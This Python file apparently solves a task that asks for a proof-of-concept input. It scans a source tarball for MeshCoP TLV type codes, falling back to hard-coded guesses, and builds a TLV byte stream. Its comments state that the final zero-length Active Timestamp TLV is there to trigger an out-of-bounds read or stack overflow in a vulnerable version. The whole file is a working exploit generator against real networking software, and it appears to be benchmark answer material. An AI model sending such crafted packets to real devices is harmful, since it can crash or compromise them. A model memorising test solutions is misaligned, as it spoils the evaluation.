import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        def extract_texts(tar_path):
            files = []
            try:
                with tarfile.open(tar_path, 'r:*') as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name
                        if not name.lower().endswith(('.h', '.hh', '.hpp', '.c', '.cc', '.cpp', '.cxx', '.inc')):
                            continue
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read()
                        try:
                            text = data.decode('utf-8', 'ignore')
                        except Exception:
                            continue
                        files.append((name, text))
            except Exception:
                pass
            return files

        def strip_comments(s: str) -> str:
            # Remove // comments
            s = re.sub(r'//.*', '', s)
            # Remove /* ... */ comments
            s = re.sub(r'/\*.*?\*/', '', s, flags=re.DOTALL)
            return s

        def safe_int(val: str):
            val = val.strip()
            # Handle hex or decimal
            try:
                return int(val, 0)
            except Exception:
                # Try to extract numeric from expressions like (0x14)
                m = re.search(r'(0x[0-9A-Fa-f]+|\d+)', val)
                if m:
                    try:
                        return int(m.group(1), 0)
                    except Exception:
                        return None
                return None

        def parse_enum_block(block: str):
            # block is content between { and }
            mapping = {}
            last_val = -1
            # Split by commas at top level
            parts = block.split(',')
            for p in parts:
                tok = p.strip()
                if not tok:
                    continue
                # Remove possible attributes like = {...}
                # Keep until first = or end
                # Example: kActiveTimestamp = 0x14
                m = re.match(r'^([A-Za-z_]\w*)\s*(?:=\s*([^,{}]+))?$', tok)
                if not m:
                    continue
                name = m.group(1).strip()
                val_expr = m.group(2)
                if val_expr is not None:
                    val = safe_int(val_expr)
                    if val is None:
                        # if cannot parse, skip value assignment
                        # but keep last_val unchanged
                        pass
                    else:
                        last_val = val
                        mapping[name] = last_val
                        continue
                # No explicit value
                last_val += 1
                mapping[name] = last_val
            return mapping

        def find_tlv_types(files_texts):
            # Try to get numeric type codes for ActiveTimestamp, PendingTimestamp, DelayTimer
            wanted = ['ActiveTimestamp', 'PendingTimestamp', 'DelayTimer']
            out = {k: None for k in wanted}

            # First pass: direct assignments
            for path, text in files_texts:
                t = strip_comments(text)
                for name in list(out.keys()):
                    if out[name] is not None:
                        continue
                    # Try a few likely patterns
                    patterns = [
                        rf'\b[kK]Type{name}\s*=\s*(0x[0-9A-Fa-f]+|\d+)',
                        rf'\b[kK]{name}\s*=\s*(0x[0-9A-Fa-f]+|\d+)',
                        rf'\b{name}\s*=\s*(0x[0-9A-Fa-f]+|\d+)',
                    ]
                    for pat in patterns:
                        m = re.search(pat, t)
                        if m:
                            try:
                                out[name] = int(m.group(1), 0)
                            except Exception:
                                pass
                            if out[name] is not None:
                                break

            # Second pass: parse enum blocks
            for path, text in files_texts:
                t = strip_comments(text)
                # Find enum blocks
                for m in re.finditer(r'enum\s+(?:class\s+)?[A-Za-z_]\w*(?:\s*:\s*\w+)?\s*{([^}]*)}', t, flags=re.DOTALL):
                    block = m.group(1)
                    # quick check
                    if not any(name in block for name in wanted):
                        continue
                    mapping = parse_enum_block(block)
                    for name in list(out.keys()):
                        if out[name] is None:
                            # try forms: kActiveTimestamp, ActiveTimestamp, kTypeActiveTimestamp
                            candidates = [f'k{name}', name, f'kType{name}']
                            for cand in candidates:
                                if cand in mapping:
                                    out[name] = mapping[cand]
                                    break

            return out

        files_texts = extract_texts(src_path)
        type_map = find_tlv_types(files_texts)

        # Choose defaults if not found
        t_active = type_map.get('ActiveTimestamp')
        t_pending = type_map.get('PendingTimestamp')
        t_delay = type_map.get('DelayTimer')

        # Fallback guesses (common in MeshCoP TLVs). These are guesses; actual code scanning above should succeed.
        if t_active is None:
            t_active = 0x14  # Guess based on common MeshCoP TLV layouts
        if t_pending is None:
            t_pending = 0x15  # Guess
        if t_delay is None:
            t_delay = 0x34  # Guess ~52 decimal

        # Ensure they are 0..255
        def clamp_byte(v, default):
            try:
                v = int(v)
            except Exception:
                return default
            if 0 <= v <= 255:
                return v
            return default

        t_active = clamp_byte(t_active, 0x14)
        t_pending = clamp_byte(t_pending, 0x15)
        t_delay = clamp_byte(t_delay, 0x34)

        # Build TLV stream
        # We craft:
        # - A couple of benign zero-length TLVs (high type values) which will be ignored
        # - Then zero-length PendingTimestamp and DelayTimer TLVs (harmless if not read)
        # - Finally zero-length ActiveTimestamp TLV placed at the very end to trigger OOB read/stack overflow in vulnerable version
        out = bytearray()
        # Add benign placeholders unlikely to conflict with actual important TLVs
        out.extend(bytes([0xFE, 0x00]))
        out.extend(bytes([0xFF, 0x00]))
        # Add zero-length pending and delay timer TLVs first (not at end)
        out.extend(bytes([t_pending, 0x00]))
        out.extend(bytes([t_delay, 0x00]))
        # Final TLV: Active Timestamp with zero length to trigger the bug
        out.extend(bytes([t_active, 0x00]))

        return bytes(out)